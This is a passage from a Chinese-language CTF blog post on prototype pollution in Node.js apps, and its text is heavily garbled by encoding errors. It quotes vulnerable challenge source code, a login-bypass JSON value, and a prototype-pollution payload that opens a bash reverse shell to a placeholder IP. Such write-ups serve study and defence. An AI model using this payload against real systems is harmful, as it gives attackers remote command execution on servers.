<p>æ”»å‡»æ¡ˆä¾‹å‡ºè‡ªï¼šPrototype pollution attacks in NodeJS applications</p>
<p>è¿™æ ·çš„æ¼æ´åœ¨ jQuery $.extend ä¸­ä¹Ÿç»å¸¸è§åˆ°<br>å¯¹äº jQueryï¼šå¦‚æœæ‹…å¿ƒå®‰å…¨é—®é¢˜ï¼Œå»ºè®®å‡çº§è‡³æœ€æ–°ç‰ˆæœ¬ jQuery 3.4.0ï¼Œå¦‚æœè¿˜åœ¨ä½¿ç”¨ jQuery çš„ 1.x å’Œ 2.x ç‰ˆæœ¬ï¼Œé‚£ä¹ˆä½ çš„åº”ç”¨ç¨‹åºå’Œç½‘ç«™ä»æœ‰å¯èƒ½é­å—æ”»å‡»ã€‚</p>
<h4 id="ç™»å½•ç»•è¿‡é¢˜"><a href="#ç™»å½•ç»•è¿‡é¢˜" class="headerlink" title="ç™»å½•ç»•è¿‡é¢˜"></a>ç™»å½•ç»•è¿‡é¢˜</h4><p>{â€œuserâ€:[0],â€passwdâ€:[0]}</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png" srcset="/img/loading.gif" lazyload></p>
<p>è¿™é¢˜å¯ä»¥æ§åˆ¶ host å‚æ•°å»ç¯¡æ”¹ mysql çš„è¿æ¥åœ°å€ åˆ©ç”¨ mysql å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶è¯»å– <a target="_blank" rel="noopener" href="https://blog.csdn.net/ls1120704214/article/details/88174003">https://blog.csdn.net/ls1120704214/article/details/88174003</a></p>
<p>ä½†æ˜¯å¦‚æœç›´æ¥åœ¨ json ä¸­ä¼ é€’{â€œhostâ€:â€â€},æ ¹æœ¬ä¸ä¼šæœ‰ä»»ä½•æ•ˆæœ<br>åœ¨ 57 è¡Œ<br><code>if (body.host != undefined) &#123;</code><br>å¦‚æœå‘ç°æœ‰ç›´æ¥ä¼ é€’è¿›æ¥çš„ host å‚æ•°ï¼Œnodejs å°±æŠ¥é”™é€€å‡ºï¼Œæ‰€ä»¥ï¼Œé€šè¿‡ä»”ç»†è§‚å¯Ÿæºä»£ç ï¼Œå‘ç°è¿™ä¸ªä»£ç æœ‰å‚æ•°æ±¡æŸ“é—®é¢˜ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ„é€ å¦‚ä¸‹å‚æ•°å»æ”¹å˜ host å‚æ•°ï¼ŒæŠŠ host å‚æ•°å˜æˆæˆ‘ä»¬è‡ªå·± mysql æœåŠ¡å™¨çš„åœ°å€<br>åŸé¢˜ä½œè€…åšå®¢<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6991">https://xz.aliyun.com/t/6991</a></p>
<p>ä¸ç”¨ host å‚æ•°ç¯¡æ”¹ mysql åœ°å€ è¿˜å¯ä»¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“ï¼š<br><code>&#123;&quot;user&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;test&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xx/6666 0&gt;&amp;1\&quot;&#39;);var __tmp2&quot;&#125;&#125;</code></p>
<h4 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//å¤„ç†JSONæ•°æ®</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//è®¾ç½®ä¸€ä¸‹Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//è°ƒç”¨ejsè¿›è¡Œæ¸²æŸ“</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//æ¸²æŸ“å†…å®¹</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//åŠ¨æ€å¼•å…¥æˆå‘˜å˜é‡</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//ä¼ å›æ¥</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//å°†bodyä¸­çš„æ•°æ®ä¼ å…¥sessioNä¸­</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language,<br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//æ¸²æŸ“è‡ªå·±çš„é€‰æ‹©</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">var</span> user = [] <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span> (<span class="hljs-params">mat</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>) &#123;<br>        count += <span class="hljs-number">1</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span><br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>))<br>app.use(bodyParser.json())<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>)<br>morganBody(app)<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express)<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>  &#125;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>)<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">/*this is under development I guess ??*/</span><br>  <span class="hljs-built_in">console</span>.log(user.admintoken)<br>  <span class="hljs-keyword">if</span> (<br>    user.admintoken &amp;&amp;<br>    req.query.querytoken &amp;&amp;<br>    md5(user.admintoken) === req.query.querytoken<br>  ) &#123;<br>    res.send(<br>      <span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span><br>    )<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> client = req.body<br>  <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span><br><br>  <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>) &#123;<br>    client.row %= <span class="hljs-number">3</span><br>    client.col %= <span class="hljs-number">3</span><br>  &#125;<br>  matrix[client.row][client.col] = client.data<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: <span class="hljs-number">0</span> &#125;))<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: winner &#125;))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span> &#125;))<br>  &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure>

<p>é¦–å…ˆåˆ¤æ–­è¯·æ±‚æ–¹å¼æ˜¯ POSTï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥ï¼Œé€šè¿‡ lodash.mergeï¼Œå°†æˆ‘ä»¬ body ä¸­çš„æ•°å€¼ç»™ data,ç„¶å session ä¸­å‚¨å­˜è¿™ä¸ª dataï¼Œè¿™é‡Œä¹Ÿå¤§æ¦‚è·Ÿäº†ä¸€ä¸‹ lodash.mergeï¼Œå…¶åŸç†åº”è¯¥å°±æ˜¯æ­£å¸¸çš„ mergeã€‚</p>
<p>èµ‹å€¼å®Œäº†ä¹‹åè¿›è¡Œæ¸²æŸ“ index,åœ¨æ¸²æŸ“çš„é€‚åˆï¼Œä¼šè·³åˆ°ä¸‹é¢è¿™ä¸ªå‡½æ•°</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123;<br>  <span class="hljs-comment">// define the template engine</span><br>  fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>    <span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123; ...options &#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/cs/">cs</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 åè®®</a> ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2021/05/27/Docker/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Docker</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/">
                        <span class="hidden-mobile">vmè¯ä¹¦bug</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
              <!-- Comments -->
              <article class="comments" id="comments" lazyload>
                
                  
                
                
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


              </article>
            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">è½½å…¥å¤©æ•°...</span> <span id="times">è½½å…¥æ—¶åˆ†ç§’...</span> <script src="/js/duration.js"></script> </div> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- ä¸è’œå­ç»Ÿè®¡PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            æ€»è®¿é—®é‡ 
            <span id="busuanzi_value_site_pv"></span>
             æ¬¡
          </span>
      
      
        <!-- ä¸è’œå­ç»Ÿè®¡UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            æ€»è®¿å®¢æ•° 
            <span id="busuanzi_value_site_uv"></span>
             äºº
          </span>
      
    
  </div>


  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
  



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>




  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>












  

  
    <!-- Google Analytics -->
    <script defer>
      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
      ga.l = +new Date;
      ga('create', 'G-SL9T1KRBQY', 'auto');
      ga('send', 'pageview');
    </script>
    <script async src='https://www.google-analytics.com/analytics.js'></script>
  

  

  

  

  





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ ä¿æŒåœ¨æœ€åº•éƒ¨ -->
<script  src="/js/boot.js" ></script>


</body>
</html>
